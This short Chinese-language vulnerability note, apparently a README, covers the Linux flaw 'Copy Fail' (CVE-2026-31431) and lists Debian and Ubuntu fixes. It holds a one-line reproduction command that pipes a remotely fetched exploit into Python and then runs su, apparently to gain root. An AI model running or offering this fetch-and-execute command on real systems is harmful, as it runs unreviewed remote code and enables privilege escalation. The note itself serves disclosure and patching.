# Copy Fail

官网：[copy.fail](https://copy.fail)

复现：`curl https://copy.fail/exp | python3 && su`

发行版修复方式：

- Debian：通过内核更新修复，https://security-tracker.debian.org/tracker/CVE-2026-31431
- Ubuntu：通过 kmod 分发 modprobe 黑名单，https://ubuntu.com/security/CVE-2026-31431
